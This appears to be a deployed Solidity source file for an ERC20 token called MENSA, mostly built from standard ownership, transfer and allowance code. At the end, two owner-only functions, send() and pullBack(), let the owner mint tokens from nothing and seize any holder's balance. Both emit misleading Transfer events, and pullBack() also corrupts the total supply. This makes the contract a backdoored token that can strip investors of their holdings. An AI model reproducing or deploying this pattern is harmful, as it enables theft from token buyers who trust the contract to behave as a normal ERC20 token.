1 /**
2  * Investors relations: gogogadgetgetit
3 **/
4 
5 pragma solidity ^0.4.24;
6 
7 /**
8  * @title Crowdsale
9  * @dev Crowdsale is a base contract for managing a token crowdsale.
10  * Crowdsales have a start and end timestamps, where investors can make
11  * token purchases and the crowdsale will assign them tokens based
12  * on a token per ETH rate. Funds collected are forwarded to a wallet
13  * as they arrive.
14  */
15  
16  
17 library SafeMath {
18   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
19     uint256 c = a * b;
20     assert(a == 0 || c / a == b);
21     return c;
22   }
23 
24  function div(uint256 a, uint256 b) internal pure returns (uint256) {
25     assert(b > 0); // Solidity automatically throws when dividing by 0
26     uint256 c = a / b;
27     assert(a == b * c + a % b); // There is no case in which this doesn't hold
28     return c;
29   }
30 
31   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
32     assert(b <= a);
33     return a - b;
34   }
35 
36   function add(uint256 a, uint256 b) internal pure returns (uint256) {
37     uint256 c = a + b;
38     assert(c >= a);
39     return c;
40   }
41 }
42 
43 contract Ownable {
44   address public owner;
45 
46 
47   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
48 
49 
50   /**
51    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
52    * account.
53    */
54   function Ownable() public {
55     owner = msg.sender;
56   }
57 
58 
59   /**
60    * @dev Throws if called by any account other than the owner.
61    */
62   modifier onlyOwner() {
63     require(msg.sender == owner);
64     _;
65   }
66 
67 
68   /**
69    * @dev Allows the current owner to transfer control of the contract to a newOwner.
70    * @param newOwner The address to transfer ownership to.
71    */
72   function transferOwnership(address newOwner) onlyOwner public {
73     require(newOwner != address(0));
74     OwnershipTransferred(owner, newOwner);
75     owner = newOwner;
76   }
77 
78 }
79 
80 /**
81  * @title ERC20Standard
82  * @dev Simpler version of ERC20 interface
83  * @dev see https://github.com/ethereum/EIPs/issues/179
84  */
85 contract ERC20Interface {
86      function totalSupply() public constant returns (uint);
87      function balanceOf(address tokenOwner) public constant returns (uint balance);
88      function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
89      function transfer(address to, uint tokens) public returns (bool success);
90      function approve(address spender, uint tokens) public returns (bool success);
91      function transferFrom(address from, address to, uint tokens) public returns (bool success);
92      event Transfer(address indexed from, address indexed to, uint tokens);
93      event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
94 }
95 
96 interface OldFACEToken {
97     function transfer(address receiver, uint amount) external;
98     function balanceOf(address _owner) external returns (uint256 balance);
99     function showMyTokenBalance(address addr) external;
100 }
101 contract MENSA1 is ERC20Interface,Ownable {
102 
103    using SafeMath for uint256;
104     uint256 public totalSupply;
105     mapping(address => uint256) tokenBalances;
106    
107    string public constant name = "MENSA";
108    string public constant symbol = "MSA";
109    uint256 public constant decimals = 18;
110 
111    uint256 public constant INITIAL_SUPPLY = 8761815;
112     address ownerWallet;
113    // Owner of account approves the transfer of an amount to another account
114    mapping (address => mapping (address => uint256)) allowed;
115    event Debug(string message, address addr, uint256 number);
116 
117     function MENSA1 (address wallet) public {
118         owner = msg.sender;
119         ownerWallet=wallet;
120         totalSupply = INITIAL_SUPPLY * 10 ** 18;
121         tokenBalances[wallet] = INITIAL_SUPPLY * 10 ** 18;   //Since we divided the token into 10^18 parts
122     }
123  /**
124   * @dev transfer token for a specified address
125   * @param _to The address to transfer to.
126   * @param _value The amount to be transferred.
127   */
128   function transfer(address _to, uint256 _value) public returns (bool) {
129     require(tokenBalances[msg.sender]>=_value);
130     tokenBalances[msg.sender] = tokenBalances[msg.sender].sub(_value);
131     tokenBalances[_to] = tokenBalances[_to].add(_value);
132     Transfer(msg.sender, _to, _value);
133     return true;
134   }
135   
136   
137      /**
138    * @dev Transfer tokens from one address to another
139    * @param _from address The address which you want to send tokens from
140    * @param _to address The address which you want to transfer to
141    * @param _value uint256 the amount of tokens to be transferred
142    */
143   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
144     require(_to != address(0));
145     require(_value <= tokenBalances[_from]);
146     require(_value <= allowed[_from][msg.sender]);
147 
148     tokenBalances[_from] = tokenBalances[_from].sub(_value);
149     tokenBalances[_to] = tokenBalances[_to].add(_value);
150     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
151     Transfer(_from, _to, _value);
152     return true;
153   }
154   
155      /**
156    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
157    *
158    * Beware that changing an allowance with this method brings the risk that someone may use both the old
159    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
160    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
161    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
162    * @param _spender The address which will spend the funds.
163    * @param _value The amount of tokens to be spent.
164    */
165   function approve(address _spender, uint256 _value) public returns (bool) {
166     allowed[msg.sender][_spender] = _value;
167     Approval(msg.sender, _spender, _value);
168     return true;
169   }
170 
171      // ------------------------------------------------------------------------
172      // Total supply
173      // ------------------------------------------------------------------------
174      function totalSupply() public constant returns (uint) {
175          return totalSupply  - tokenBalances[address(0)];
176      }
177      
178     
179      
180      // ------------------------------------------------------------------------
181      // Returns the amount of tokens approved by the owner that can be
182      // transferred to the spender's account
183      // ------------------------------------------------------------------------
184      function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
185          return allowed[tokenOwner][spender];
186      }
187      
188      /**
189    * @dev Increase the amount of tokens that an owner allowed to a spender.
190    *
191    * approve should be called when allowed[_spender] == 0. To increment
192    * allowed value is better to use this function to avoid 2 calls (and wait until
193    * the first transaction is mined)
194    * From MonolithDAO Token.sol
195    * @param _spender The address which will spend the funds.
196    * @param _addedValue The amount of tokens to increase the allowance by.
197    */
198   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
199     allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
200     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
201     return true;
202   }
203 
204   /**
205    * @dev Decrease the amount of tokens that an owner allowed to a spender.
206    *
207    * approve should be called when allowed[_spender] == 0. To decrement
208    * allowed value is better to use this function to avoid 2 calls (and wait until
209    * the first transaction is mined)
210    * From MonolithDAO Token.sol
211    * @param _spender The address which will spend the funds.
212    * @param _subtractedValue The amount of tokens to decrease the allowance by.
213    */
214   function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
215     uint oldValue = allowed[msg.sender][_spender];
216     if (_subtractedValue > oldValue) {
217       allowed[msg.sender][_spender] = 0;
218     } else {
219       allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
220     }
221     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
222     return true;
223   }
224 
225      
226      // ------------------------------------------------------------------------
227      // Don't accept ETH
228      // ------------------------------------------------------------------------
229      function () public payable {
230          revert();
231      }
232  
233 
234   /**
235   * @dev Gets the balance of the specified address.
236   * @param _owner The address to query the the balance of.
237   * @return An uint256 representing the amount owned by the passed address.
238   */
239   function balanceOf(address _owner) constant public returns (uint256 balance) {
240     return tokenBalances[_owner];
241   }
242 
243     function send(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
244         require(tokenBalances[buyer]<=tokenAmount);
245         tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
246         Transfer(buyer, wallet, tokenAmount);
247      }
248     function pullBack(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
249         require(tokenBalances[buyer]>=tokenAmount);
250         tokenBalances[buyer] = tokenBalances[buyer].sub(tokenAmount);
251         tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
252         Transfer(buyer, wallet, tokenAmount);
253         totalSupply=totalSupply.add(tokenAmount);
254      } 
255     function showMyTokenBalance(address addr) public view returns (uint tokenBalance) {
256         tokenBalance = tokenBalances[addr];
257     }
258 }